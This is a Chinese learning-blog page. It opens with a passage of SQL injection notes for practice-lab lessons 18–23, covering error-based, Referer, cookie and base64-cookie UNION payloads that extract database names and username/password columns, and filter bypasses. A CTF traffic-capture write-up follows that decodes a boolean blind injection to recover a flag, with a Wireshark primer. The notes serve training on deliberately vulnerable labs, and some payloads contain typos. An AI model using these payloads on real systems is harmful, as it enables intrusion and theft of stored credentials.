<p>’ or updatexml（1，concat（0x7e，（database（））），1），‘’，‘’）#进行注入</p>
<h1 id="lesson-19-referer-injection"><a href="#lesson-19-referer-injection" class="headerlink" title="lesson 19 referer injection"></a>lesson 19 referer injection</h1><p>同样的方法选择用</p>
<ol>
<li><p>‘ or updatexml(1,concat(0x7e,(database())),1) and ‘1’=’1</p>
</li>
<li><p>‘ or updatexml(1,concat(0x7e,(database())),1) ,’’)#</p>
<p>来闭合在抓包referer处修改注入</p>
<p>与lesson18相同。</p>
</li>
</ol>
<h1 id="lesson-20-cookie-injection"><a href="#lesson-20-cookie-injection" class="headerlink" title="lesson 20 cookie injection"></a>lesson 20 cookie injection</h1><p>抓包，在cookie那里注入</p>
<p>cookie：uname=1’ union select 1,2,database()#</p>
<p>利用联合查询注入</p>
<p>查表</p>
<p>cookie：uname=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ )#</p>
<p>查列</p>
<p>cookie：uname=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=’security’and table_name=’users’#</p>
<p>查字段</p>
<p>cookie：uname=1’ union select 1，2，group_concat(concat_ws(‘@@’,id,username,password)) from users</p>
<h1 id="lesson-21-cookie-injection"><a href="#lesson-21-cookie-injection" class="headerlink" title="lesson 21 cookie injection"></a>lesson 21 cookie injection</h1><p>跟lesson20思路一样，就是cookie明文经过base64加密</p>
<p><a target="_blank" rel="noopener" href="https://tool.oschina.net/encrypt?type=3">base64在线加密</a></p>
<p>查库</p>
<p>‘) union select 1,2,database()#</p>
<p>表</p>
<p>‘) union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’),3#</p>
<p>列</p>
<p>)’ union select 1,2,(select goup_concat(column_name) from information_schema.columns where table_name=’users’)#</p>
<p>字段</p>
<p>‘) union select 1,group_concat(concat_ws(‘@@’,username,password)),2#</p>
<h1 id="lession-22-cookie-injection"><a href="#lession-22-cookie-injection" class="headerlink" title="lession 22 cookie injection"></a>lession 22 cookie injection</h1><p>和上一关一样，只是闭合单引号变成了双引号。</p>
<h1 id="lession-23"><a href="#lession-23" class="headerlink" title="lession 23"></a>lession 23</h1><p><img src="https://s2.loli.net/2022/02/09/VkWy5IBbQf1gpc2.png" alt="QQ截图20220209170517.png"></p>
<p>这里对#和–都做了转译</p>
<p>法一：因为被处理的是注释符号，所以只要用–+和#以外的的注释符就行了。（用;%00来注释）</p>
<p>法二：避免使用注释符，而是用and ‘1’=’1来包裹</p>
<p>查库</p>
<p>？id=-1’ union select 1,database(),3 and ‘1’=’1</p>
<p>查表</p>
<p>？id=-1’ union select 1,goup_concat(table_name)from information_schema.tables where table_schema=’security’ limit 0,1),3 and ‘1’=’1</p>
<p>查列</p>
<p>？id=-1’ union select 1,group_concat(column_name)from information_schema.columns where table=’users’),3 and’1’=’1 </p>
<p>查字段</p>
<p>？id=-1’ union select 1,group_concat(concat_ws(@@,username,password))from users,3 and ‘1’=’1</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/24/%E2%80%9C%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%9D%E4%B9%8Bsqltest/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/24/%E2%80%9C%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%9D%E4%B9%8Bsqltest/" class="post-title-link" itemprop="url">“流量包分析”之sqltest</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-11-24 20:41:47" itemprop="dateCreated datePublished" datetime="2021-11-24T20:41:47+08:00">2021-11-24</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-02-23 12:50:28" itemprop="dateModified" datetime="2022-02-23T12:50:28+08:00">2022-02-23</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>原本只是想刷一刷sql注入的却意外的找到了一道misc题但是和sql注入关系紧密的sqltest。</p>
<p>这是一道流量包分析，首先先下载流量包。</p>
<p>然后百度下载可以打开浏览包的软件，O(∩_∩)O哈哈~~</p>
<h2 id="第一次查看流量包"><a href="#第一次查看流量包" class="headerlink" title="第一次查看流量包"></a>第一次查看流量包</h2><p><img src="https://i.loli.net/2021/11/24/Zk8itW9lrwKmVO4.png" alt="QQ截图20211124204947.png"></p>
<p>这密密麻麻的字确实让人望而却步，但是还是可以看出一些端倪。</p>
<p>比如其中有一些get请求意外的相似：</p>
<p>GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;99 </p>
<p>8084    11.866325    10.0.2.15    172.16.80.11    HTTP    495    GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;98 </p>
<p>8094    11.872110    10.0.2.15    172.16.80.11    HTTP    495    GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;98 HTTP/1.1 </p>
<p>仔细看这不就是布尔盲注的爆破内容。</p>
<p>刚好解释了为啥这题的名字叫做sqltest</p>
<p>所以就简单了，道理就只要把最后一句查字段的爆破类容找出来就行，ascii码转一下就行了，但是！！我wireshark（查看浏览包的应用）没玩明白。。。惨惨π_π。</p>
<p>在查了一大堆教程以后，终于有了一点眉目。</p>
<p>首先在过滤器里搜索http（协议） get（请求）</p>
<p><img src="https://i.loli.net/2021/11/24/jBCIbVvTX5iGsxQ.png" alt="QQ截图20211124220332.png"></p>
<p>发现返回的的长度有两种1095和1025</p>
<p><img src="https://i.loli.net/2021/11/24/4ThqzAeRiHmEwul.png" alt="QQ截图20211124221517.png"></p>
<p>之所以返回变长了就是多了上面的部分。因此可知1095的语句是正确的</p>
<p>然后导出过滤concat</p>
<p><img src="https://i.loli.net/2021/11/24/luDcLFwZepoXjb5.png" alt="QQ截图20211124222854.png"></p>
<p>然后判断正确ascii码正确的为</p>
<p>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50  56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</p>
<p>所对应为</p>
<p>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p>
<h1 id="关于wireshark"><a href="#关于wireshark" class="headerlink" title="关于wireshark"></a>关于wireshark</h1><p>wireshark是一个网络封包工具，可以截取各种网络数据包，并显示数据包详细信息</p>
<p><img src="https://i.loli.net/2021/11/26/oMcbNGYlUpP4Iqu.png" alt="wireshark.png"></p>
<p>详细使用类容参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/zzwwhhpp/article/details/113077747?utm_source=app&app_version=4.18.0&code=app_1562916241&uLinkId=usr1mkqgl919blen">csdn</a></p>
<p>执行ping+域名</p>
<h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p><img src="https://i.loli.net/2021/11/26/2HWM6ptYimaIcOR.png" alt="wireshark过滤器.png"></p>
<h3 id="数据包列表"><a href="#数据包列表" class="headerlink" title="数据包列表"></a>数据包列表</h3><p><img src="https://i.loli.net/2021/11/26/Lct7mxsWI3AjToM.png" alt="wireshark2.png"></p>
<h3 id="数据包详细信息"><a href="#数据包详细信息" class="headerlink" title="数据包详细信息"></a>数据包详细信息</h3><ol>
<li>frame：物理层数据帧概况</li>
<li>Ethernet||：数据链路层以太网头部信息</li>
<li>internet Protocol Version 4:互联网层IP包头部信息</li>
<li>Transmission control protocol：传输层T的数据段头部信息</li>
<li>Hypertext Transfer Protocol：应用层信息</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">wang deshan</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
